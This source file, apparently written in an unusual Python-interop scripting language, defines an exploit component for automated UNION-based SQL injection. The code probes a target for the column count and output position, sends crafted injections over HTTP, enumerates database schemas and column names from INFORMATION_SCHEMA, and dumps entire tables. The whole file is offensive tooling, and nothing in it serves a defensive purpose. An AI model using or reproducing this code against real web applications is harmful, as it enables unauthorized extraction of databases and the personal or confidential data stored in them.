#'SqlUnionOutputInfo';

class init ExploitComponent SqlUnionProbe {
    emitter: SqlEmitter(),
    output: null,
    
    __init__: @(httpTemplate, maxColumns = 0x20) { },
    
    findOutput: @{
        self.emitter = SqlEmitter();
        columns = 0;
        self.log('[?] Searching for union count and output');
        
        while (true) {
            columns++;
            
            cols = range(0, columns)
                @select(@(x) self.emitter.junkString());
                
            quote = cols[0][0];
            
            colVals = cols 
                @select(@(x) x.lstrip(quote).rstrip(quote));
                
            resp = cols 
            |> self.createInjection 
            |> self.sendRequest;
            
            matches = colVals @where(resp.__contains__);
            
            if (matches |> len @!= 0) {
                offset = colVals.index(matches[0]);
                
                msg = '[+] Output found: Columns={}, Offset={}'
                    .format(columns, offset);
                    
                self.log(msg);
                ret SqlUnionOutputInfo(columns, offset);
            }
            
            if (columns >= self.maxColumns) ret null;
        }
    },
    
    inject: @(columns, table, where = null) {
        hasOutput = @() self.output != null;
        
        if (!hasOutput()) self.output = self.findOutput();
        
        if (!hasOutput()) {
            self.log('[X] Could not find output for injection');
            
            ret null;
        }
        
        injector = SqlUnionInjector(
            { HOST: 'localhost', PORT: 80 },
            self.output.columnCount,
            self.output.columnNumber,
            columns,
            table,
            where = where);
        
        injector.payload = injector.dump;            
        resp = injector.str() |> self.sendRequest;
        
        ret injector.finalize(resp);
    },
    
    parseSchema: @(schemas) {
        if (schemas == null) ret null;
        
        d = schemas @select(@(x) x[0]) |> distinct;
        dbs = dict();
        
        for (x in d)
            dbs[x] = schemas @where(@(y) x == y[0]) @select(@(y) y[1]);
        
        ret dbs;
    },
    
    listSchemas: @()
        self.inject(
            [ 'TABLE_SCHEMA', 'TABLE_NAME' ],
            'INFORMATION_SCHEMA.Tables')        
        |> self.parseSchema,
    
    listColumns: @(schema, table) {
        self.log('[?] Querying information schema for column names');
        
        whereTmpl = 
            " WHERE INFORMATION_SCHEMA.COLUMNS.TABLE_SCHEMA = '{0}' AND" + 
            " INFORMATION_SCHEMA.COLUMNS.TABLE_NAME='{1}'";
        
        cols = self.inject(
            [ 'COLUMN_NAME' ],
            'INFORMATION_SCHEMA.COLUMNS',
            where = whereTmpl.format(schema, table));
            
        if (cols == null) {
           self.log('[X] Could not query information schema');
           
           ret null;
        }
            
        tup = cols @select(@(x) '[' + x[0] + ']') @join(', ');            
        self.log('[+] Columns found: ' + tup);
        
        ret cols;
    },
    
    dumpTable: @(table, schema = null, columns = null)
        self.inject(
            schema != null ? 
                self.listColumns(schema, table) : 
                columns,
            table),
    
    sendRequest: @(injection) {
        values = { sqli: injection };
        get = self.httpTemplate.getUrl(values);
        self.log('[?] %s\r\n' % get);
        post = self.httpTemplate.getPost(values);
        resp = urllib2.urlopen(get, post).read();
        
        ret resp;
    },
    
    createInjection: @(cols) Injection(
        self.emitter.quote(),
        self.emitter.comment(),
        @() self.emitter.unionAll(cols)),
};